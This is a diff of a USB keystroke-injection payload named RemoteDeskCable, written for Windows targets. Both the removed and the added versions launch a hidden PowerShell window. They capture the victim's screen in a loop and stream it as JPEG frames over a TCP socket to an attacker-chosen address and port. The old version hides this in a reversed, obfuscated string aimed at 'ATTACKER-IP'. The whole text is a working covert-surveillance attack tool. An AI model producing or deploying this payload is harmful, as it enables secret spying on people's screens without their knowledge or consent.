@@ -1,18 +1,43 @@
-REM       RemoteDeskCable
-REM       Version 2.1
-REM       OS: Windows
-REM       Author: 0iphor13
-REM       Description: Getting remote screen access to view your targets actions
+REM   Title: RemoteDeskCable
+REM   Version: 3.0
+REM   OS: Windows
+REM   Author: 0iphor13
+REM   Description: Get remote screen access to view targets screen.
+REM   Requirements: Firmware Version 3.0 min
 
-DELAY 500
+REM   Define your language below
 DUCKY_LANG de
+DELAY 500
+
+REM   Define Address and Port of your receiving system
+DEFINE #ADDRESS '0.0.0.0'
+DEFINE #PORT 1234
+
+DEFINE #NEWLINE `n
+FUNCTION SendHeader()
+STRING function SH([net.sockets.socket] $sk,$length,$code = "
+RANDOM_NUMBER
+RANDOM_NUMBER
+RANDOM_NUMBER
+SPACE
+STRING RemoteDeskCable",$h="text/html",$pl="HTTP/1.1"){$res = "HTTP/1.1 $code`r#NEWLINE" +"Content-Type: multipart/x-mixed-replace; boundary=--boundary`r#NEWLINE#NEWLINE";SSR $sk $res}SH $skt;while ($True){$b = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);$g = [System.Drawing.Graphics]::FromImage($b);$g.CopyFromScreen((New-Object System.Drawing.Point(0,0)), (New-Object System.Drawing.Point(0,0)), $b.Size);$g.Dispose();$MS.SetLength(0);$b.Save($MS,([system.drawing.imaging.imageformat]::jpeg));$b.Dispose();$length = $MS.Length;[byte[]] $bt = $MS.ToArray();$str = "#NEWLINE#NEWLINE--boundary#NEWLINE"+"Content-Type: image/jpeg#NEWLINE"+"Content-Length: $length#NEWLINE#NEWLINE";SSR $skt $str;Sr $skt $bt};
+END_FUNCTION
+
+FUNCTION SendResponse()
+STRING function Sr($sk, $sng){if ($sk.Connected){$bts = $sk.Send($sng)}};
+END_FUNCTION
+
+FUNCTION SendStrResponse()
+STRING function SSR($sk, $sng){if ($sk.Connected){$bts = $sk.Send([text.Encoding]::Ascii.GetBytes($sng))}};
+END_FUNCTION
+
 DELAY 1500
 GUI r
 DELAY 500
-STRING powershell -NoP -NonI -w hidden
+STRINGLN powershell -NoP -NonI -w h
 DELAY 500
-ENTER
-DELAY 500
-STRING $IPADDress='ATTACKER-IP';$Port=1234;$bGPy0=")''NIOj-]52,42,4[cepsMOc:VNe$ (& |)63]RAHc[,)601]RAHc[+901]RAHc[+511]RAHc[(  ECalPerc- 69]RAHc[,)47]RAHc[+55]RAHc[+78]RAHc[( ecAlpEr-43]RAHc[,'gIx' ECalPerc- )')(eso'+'lC.SMjms}setyBjms tksj'+'ms esnopseRdneS;rtsjms tksjms esn'+'opseRrtSdneS;gIxnJ7WnJ7Whtgneljms :htgneL-tnetnoCgIx + gIxnJ7Wgepj/egami :epyT-tnetnoCgIx + gIxnJ7Wyradnuob--nJ7WnJ7WgIx = rtsjms;)(yarrAoT.SMjms = setyBjms ]][etyb[;htgneL.SMjms = htgneljms;)(esopsiD.bjms;))gepj::]tamrofegami.gnigami.gniward.met'+'sys[( ,SMjms(evaS.'+'bjms;)0(htgn'+'eLteS.SMjms;)(esopsiD.gjms;)eziS.bjms'+' ,))0,'+'0'+'(tnioP'+'.gniwarD.metsyS tcejbO-weN( ,))0,0'+'(tnioP.gniwarD.metsyS tc'+'ejbO-weN((neercSmorFypoC.gjms;)bjms(eg'+'amImorF::]scihparG.gniwarD.metsyS[ = gjms;)thgieH'+'.sdn'+'uoB.neercSy'+'ramirP::]neercS.smroF.swodniW.metsyS[ ,htdiW.sdnuoB.neercSyramirP::]neerc'+'S.'+'smroF.swodniW.metsyS[(pamtiB.gniwarD.metsyS tcejbO-weN = bjms{)eurTjms( '+'elihw;tksjm'+'s redaeHdneS}serjms ksjms esnopse'+'RrtSdne'+'S;gIxnJ7WnJ7WrJ7Wyra'+'dnuob--=yradnuob ;ecalper-dexim-x/trapitlum :epyT-tnetnoCgIx + gIxnJ7WrJ7Woc'+'tsjms 1.1/PTTHgIx = serjms{)gIx1.1/PTTHg'+'Ix='+'ptthjms,gIxlmth/txetgIx=daehjms,gIxKO 002gIx = octsjms,htgneljms,ksjms ]tek'+'cos.stekcos.ten[(redaeHdneS noitcnuf}}))gnirtsjms'+'(setyBteG.i'+'icsA::]gnidocnE.txet[(dneS.ksjms ='+' stbjms{)detcennoC.ksjms( fi{)gnirtsj'+'ms ,ksjm'+'s(esnopseRrtSdneS noitcnu'+'f}})gnirtsjms(dneS.ksj'+'ms = stbjms{)detcennoC.ksjms( fi{)gnirtsjms ,ksjms(esnopseRdneS'+' noitcnuf;)troPjms,sserddAPIjms(tcennoC.tksjms;)pcT::]epyTlocotorP.ste'+'kcoS.teN.metsyS[ ,maertS::]epyTt'+'ekcoS.stekcoS.teN.m'+'etsyS[ ,krowteNretnI::]ylimaFsserddA.ste'+'kcoS.teN.metsyS[( tekcoS.stekcoS'+'.teN.metsyS tcejbO-weN = tksjms;maertSyrom'+'e'+'M.OI.metsyS t'+'cejbO-weN = SMjms'+' ]maertSy'+'romeM.OI.metsyS[;smroF.swodniW.metsyS emaNylb'+'messA- epyT-ddA'(( ";  . ( $enV:cOMspEc[4,15,25]-joIn'') ( "$(SEt-item 'vaRIaBLE:oFs'  '' )"+ [sTriNG]( ( vaRIABlE BgpY0 -VAl  )[ - 1..- ( ( vaRIABlE BgpY0 -VAl  ).LENgTh) ] )+"$(seT-VARiABLe 'oFS' ' ')")
-DELAY 250
-ENTER 
+STRING Add-Type -AssemblyName System.Windows.Forms;[System.IO.MemoryStream] $MS = New-Object System.IO.MemoryStream;$skt = New-Object System.Net.Sockets.Socket ([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::Tcp);$skt.Connect(#ADDRESS,#PORT);
+SendResponse()
+SendStrResponse()
+SendHeader()
+STRINGLN $MS.Close()
